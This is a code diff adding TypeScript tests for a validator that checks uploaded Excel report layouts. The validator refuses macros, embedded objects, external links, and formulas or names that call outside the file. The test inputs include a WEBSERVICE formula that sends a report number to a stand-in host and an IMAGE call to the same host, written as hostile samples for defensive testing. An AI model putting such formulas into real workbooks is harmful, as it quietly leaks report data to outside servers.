@@ -1,6 +1,10 @@
 import { describe, expect, test } from 'bun:test';
 import PizZip from 'pizzip';
-import { field } from '../../../src/platform/reporting/index.ts';
+import {
+    field,
+    paragraph,
+    wordDocument,
+} from '../../../src/platform/reporting/index.ts';
 import {
     workbookData,
     workbookShape,
@@ -9,6 +13,7 @@ import {
     cellFormats,
     excelWorkbook,
     fillWorkbook,
+    inspectWorkbook,
     type ExcelWorkbook,
 } from '../../../src/platform/reporting/xlsx.ts';
 import { readWorkbook } from '../../support/workbook-reader.ts';
@@ -342,5 +347,276 @@ describe('excel layouts', () => {
         );
         expect(book.part('[Content_Types].xml')).not.toContain('calcChain');
         expect(book.part('xl/workbook.xml')).toContain('fullCalcOnLoad="1"');
+    });
+});
+
+// Workbook yang disunting di luar mesin: layout bawaan atau hasil unduhannya, lalu diubah seperti penulis layout.
+function edited(
+    change: (zip: PizZip, text: (path: string) => string) => void,
+    bytes = filled(),
+): Uint8Array {
+    const zip = new PizZip(bytes);
+    change(zip, (path) => zip.file(path)?.asText() ?? '');
+    return zip.generate({ type: 'uint8array' });
+}
+
+function withFormula(formula: string, bytes = filled()): Uint8Array {
+    return edited(
+        (zip, text) =>
+            zip.file(
+                'xl/worksheets/sheet1.xml',
+                text('xl/worksheets/sheet1.xml').replace(
+                    '<f>Report.number</f>',
+                    `<f>${formula}</f>`,
+                ),
+            ),
+        bytes,
+    );
+}
+
+describe('excel layout uploads', () => {
+    test('the built-in layout and a workbook downloaded for editing both pass', () => {
+        expect(
+            inspectWorkbook(
+                excelWorkbook(shape, cellFormats(wita), spec),
+                shape,
+            ),
+        ).toBeNull();
+        expect(inspectWorkbook(filled(), shape)).toBeNull();
+    });
+
+    test('a file that is not a workbook is refused, also a Word document', () => {
+        expect(
+            inspectWorkbook(new TextEncoder().encode('bukan excel'), shape),
+        ).toEqual({ reason: 'not-workbook' });
+        const word = wordDocument({
+            paper: { widthMm: 210, heightMm: 297 },
+            marginMm: 10,
+            font: 'Arial',
+            fontSize: 10,
+            body: [paragraph('{number}')],
+        });
+        expect(inspectWorkbook(word, shape)).toEqual({
+            reason: 'not-workbook',
+        });
+    });
+
+    test('macros, embedded objects, and data pulled from outside the file are refused', () => {
+        const added = (path: string) =>
+            inspectWorkbook(
+                edited((zip) => zip.file(path, 'x')),
+                shape,
+            );
+        expect(added('xl/vbaProject.bin')).toEqual({ reason: 'macro' });
+        expect(added('xl/embeddings/oleObject1.bin')).toEqual({
+            reason: 'embedded-object',
+        });
+        expect(added('xl/externalLinks/externalLink1.xml')).toEqual({
+            reason: 'external-source',
+        });
+        expect(added('xl/connections.xml')).toEqual({
+            reason: 'external-source',
+        });
+        const linked = edited((zip, text) =>
+            zip.file(
+                'xl/worksheets/_rels/sheet1.xml.rels',
+                text('xl/worksheets/_rels/sheet1.xml.rels').replace(
+                    '</Relationships>',
+                    '<Relationship Id="rIdX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://contoh.test/a.png" TargetMode="External"/></Relationships>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(linked, shape)).toEqual({
+            reason: 'external-source',
+        });
+    });
+
+    test('a function that calls outside the file is refused, also inside a defined name', () => {
+        expect(
+            inspectWorkbook(
+                withFormula(
+                    '_xlfn.WEBSERVICE("https://contoh.test/?n="&amp;Report.number)',
+                ),
+                shape,
+            ),
+        ).toEqual({ reason: 'external-function', functions: ['WEBSERVICE'] });
+        const named = edited((zip, text) =>
+            zip.file(
+                'xl/workbook.xml',
+                text('xl/workbook.xml').replace(
+                    '</definedNames>',
+                    '<definedName name="Logo">_xlfn.IMAGE("https://contoh.test/logo.png")</definedName></definedNames>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(named, shape)).toEqual({
+            reason: 'external-function',
+            functions: ['IMAGE'],
+        });
+        expect(
+            inspectWorkbook(
+                withFormula('"WEBSERVICE(" &amp; Report.number'),
+                shape,
+            ),
+        ).toBeNull();
+    });
+
+    test('a name or column the report does not have is refused, in cells and in pivots', () => {
+        expect(inspectWorkbook(withFormula('Report.nomor'), shape)).toEqual({
+            reason: 'unknown-references',
+            references: ['Report.nomor'],
+        });
+        expect(
+            inspectWorkbook(withFormula('SUM(services[harga])'), shape),
+        ).toEqual({
+            reason: 'unknown-references',
+            references: ['services[harga]'],
+        });
+        expect(
+            inspectWorkbook(
+                withFormula(
+                    'SUM(services[[#This Row],[amount]])+services[@quantity]',
+                ),
+                shape,
+            ),
+        ).toBeNull();
+        const pivot = edited((zip, text) =>
+            zip.file(
+                'xl/pivotCache/pivotCacheDefinition1.xml',
+                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
+                    '<cacheField name="amount"',
+                    '<cacheField name="margin"',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(pivot, shape)).toEqual({
+            reason: 'unknown-references',
+            references: ['services[margin]'],
+        });
+    });
+
+    test('the sheet of a report table holds only that table, without a total row or extra columns', () => {
+        const table = (change: (xml: string) => string) =>
+            inspectWorkbook(
+                edited((zip, text) =>
+                    zip.file(
+                        'xl/tables/table1.xml',
+                        change(text('xl/tables/table1.xml')),
+                    ),
+                ),
+                shape,
+            );
+        expect(
+            table((xml) =>
+                xml.replace('totalsRowShown="0"', 'totalsRowCount="1"'),
+            ),
+        ).toEqual({
+            reason: 'totals-row',
+            table: 'services',
+        });
+        expect(
+            table((xml) =>
+                xml.replace(
+                    '</tableColumns>',
+                    '<tableColumn id="9" name="margin"/></tableColumns>',
+                ),
+            ),
+        ).toEqual({
+            reason: 'unknown-columns',
+            table: 'services',
+            columns: ['margin'],
+        });
+        const crowded = edited((zip, text) =>
+            zip.file(
+                'xl/worksheets/sheet2.xml',
+                text('xl/worksheets/sheet2.xml').replace(
+                    '</sheetData>',
+                    '<row r="9"><c r="F9" t="inlineStr"><is><t>catatan</t></is></c></row></sheetData>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(crowded, shape)).toEqual({
+            reason: 'crowded-sheet',
+            sheet: 'Layanan',
+        });
+    });
+
+    test('a formula that reads a report sheet by cell address is refused, because the sheet is rewritten on every download', () => {
+        expect(
+            inspectWorkbook(withFormula('SUM(Layanan!D2:D3)'), shape),
+        ).toEqual({
+            reason: 'sheet-reference',
+            sheets: ['Layanan'],
+        });
+        expect(
+            inspectWorkbook(withFormula("'Keterangan laporan'!C2"), shape),
+        ).toEqual({
+            reason: 'sheet-reference',
+            sheets: ['Keterangan laporan'],
+        });
+    });
+
+    test('a name the engine writes may not be taken by the layout', () => {
+        const named = edited((zip, text) =>
+            zip.file(
+                'xl/workbook.xml',
+                text('xl/workbook.xml').replace(
+                    '</definedNames>',
+                    '<definedName name="services">Ringkasan!$A$1</definedName></definedNames>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(named, shape)).toEqual({
+            reason: 'name-taken',
+            names: ['services'],
+        });
+    });
+
+    test('a pivot that LibreOffice saved over the exact range of a report table reads that table, and keeps reading all of it after the next fill', () => {
+        const saved = edited((zip, text) =>
+            zip.file(
+                'xl/pivotCache/pivotCacheDefinition1.xml',
+                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
+                    '<worksheetSource name="services"/>',
+                    '<worksheetSource ref="A1:D3" sheet="Layanan"/>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(saved, shape)).toBeNull();
+        const refilled = readWorkbook(
+            fillWorkbook(
+                saved,
+                shape,
+                workbookData(
+                    shape,
+                    {
+                        ...values,
+                        services: [
+                            ...values.services,
+                            { ...values.services[1], name: 'Tindakan' },
+                        ],
+                    },
+                    wita,
+                ),
+                cellFormats(wita),
+            ),
+        );
+        expect(
+            refilled.part('xl/pivotCache/pivotCacheDefinition1.xml'),
+        ).toContain('<worksheetSource name="services"/>');
+        expect(refilled.table('services').rows).toHaveLength(3);
+        const partial = edited((zip, text) =>
+            zip.file(
+                'xl/pivotCache/pivotCacheDefinition1.xml',
+                text('xl/pivotCache/pivotCacheDefinition1.xml').replace(
+                    '<worksheetSource name="services"/>',
+                    '<worksheetSource ref="A1:D2" sheet="Layanan"/>',
+                ),
+            ),
+        );
+        expect(inspectWorkbook(partial, shape)).toEqual({
+            reason: 'sheet-reference',
+            sheets: ['Layanan'],
+        });
     });
 });
